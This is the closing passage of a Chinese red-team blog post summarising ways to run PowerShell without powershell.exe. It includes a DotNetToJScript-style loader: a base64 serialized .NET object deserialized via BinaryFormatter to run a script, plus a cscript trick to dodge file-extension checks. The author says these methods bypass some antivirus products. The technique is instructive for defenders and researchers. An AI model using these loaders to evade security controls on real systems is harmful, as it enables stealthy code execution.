class="line">&quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;+</span><br><span class="line">&quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;+</span><br><span class="line">&quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;+</span><br><span class="line">&quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;+</span><br><span class="line">&quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;+</span><br><span class="line">&quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;+</span><br><span class="line">&quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;+</span><br><span class="line">&quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;+</span><br><span class="line">&quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;+</span><br><span class="line">&quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;+</span><br><span class="line">&quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;+</span><br><span class="line">&quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;+</span><br><span class="line">&quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;+</span><br><span class="line">&quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;+</span><br><span class="line">&quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;+</span><br><span class="line">&quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;+</span><br><span class="line">&quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;+</span><br><span class="line">&quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAUAAAAAJlY2hvICJoZWxsbyBmcm9tIHBvd2Vyc2hlbGwtbGVz&quot;+</span><br><span class="line">&quot;cyINCmVjaG8gInRoaXMgaXMgeW91ciBwaWQ6JFBJRCINCiRwc3ZlcnNpb250YWJsZQENAAAABAAA&quot;+</span><br><span class="line">&quot;AAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0&quot;+</span><br><span class="line">&quot;ZVtdKQgAAAAKCwAA&quot;;</span><br><span class="line">var entry_class = &apos;TestClass&apos;;</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">	setversion();</span><br><span class="line">	var stm = base64ToStream(serialized_obj);</span><br><span class="line">	var fmt = new ActiveXObject(&apos;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&apos;);</span><br><span class="line">	var al = new ActiveXObject(&apos;System.Collections.ArrayList&apos;);</span><br><span class="line">	var d = fmt.Deserialize_2(stm);</span><br><span class="line">	al.Add(undefined);</span><br><span class="line">	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);</span><br><span class="line">	</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">    debug(e.message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解密后的主要逻辑如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var entry_class = &apos;TestClass&apos;;</span><br><span class="line">try &#123;</span><br><span class="line">setversion();</span><br><span class="line">var stm = base64ToStream(serialized_obj);</span><br><span class="line">var fmt = new ActiveXObject(&apos;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&apos;);</span><br><span class="line">var al = new ActiveXObject(&apos;System.Collections.ArrayList&apos;);</span><br><span class="line">var d = fmt.Deserialize_2(stm); al.Add(undefined);</span><br><span class="line">var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);</span><br><span class="line">o.RunScript(&quot;c:\\test\\test.ps1&quot;);</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">debug(e.message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="../images/psbypass/20.png" alt="image"></p>
+<p>当然你也可以用下面的方法如绕过对JS后缀的检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //e:jscript testps.txt</span><br></pre></td></tr></table></figure>
+<p>但是360无情的杀死了我们….</p>
+<p><img src="../images/psbypass/21.png" alt="image"></p>
+<h2 id="写在后面："><a href="#写在后面：" class="headerlink" title="写在后面："></a>写在后面：</h2><p>本文仅对网上常见的无PS运行PS的手段进行了总结，实验过程大家也可以看的出来，是可以bypass一些AV的，也是各有各的优缺点，最好是针对不同的AV去找出它的拦截规则，然后再进行对于的bypass操作。</p>
+<p>参考文章：</p>
+<p><a href="https://www.slideshare.net/dafthack/pwning-the-enterprise-with-powershell" target="_blank" rel="noopener">https://www.slideshare.net/dafthack/pwning-the-enterprise-with-powershell</a></p>
+<p><a href="https://www.slideshare.net/dafthack/red-team-apocalypse-rvasec-edition" target="_blank" rel="noopener">https://www.slideshare.net/dafthack/red-team-apocalypse-rvasec-edition</a></p>
+<p><a href="https://pentestn00b.wordpress.com/2017/03/20/simple-bypass-for-powershell-constrained-language-mode/" target="_blank" rel="noopener">https://pentestn00b.wordpress.com/2017/03/20/simple-bypass-for-powershell-constrained-language-mode/</a></p>
+<p><a href="https://www.youtube.com/watch?v=7tvfb9poTKg&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=7tvfb9poTKg&amp;feature=youtu.be</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/psbypass/">无powershell运行powershell方法总结</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年02月27日 - 15:02</p>
+  <p><span>最后更新:</span>2020年02月27日 - 15:02</p>
+  <p><span>原始链接:</span><a href="/psbypass/" title="无powershell运行powershell方法总结">https://lengjibo.github.io/psbypass/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/psbypass/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/asr/" rel="next" title="关于宏的bypass学习">
+                <i class="fa fa-chevron-left"></i> 关于宏的bypass学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">88</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">109</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerLine"><span class="nav-number">1.</span> <span class="nav-text">PowerLine</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerShdll"><span class="nav-number">2.</span> <span class="nav-text">PowerShdll</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nopowershell"><span class="nav-number">3.</span> <span class="nav-text">Nopowershell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SyncAppvPublishingServer"><span class="nav-number">4.</span> <span class="nav-text">SyncAppvPublishingServer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调用MSBuild-exe："><span class="nav-number">5.</span> <span class="nav-text">调用MSBuild.exe：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调用cscript："><span class="nav-number">6.</span> <span class="nav-text">调用cscript：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写在后面："><span class="nav-number">7.</span> <span class="nav-text">写在后面：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
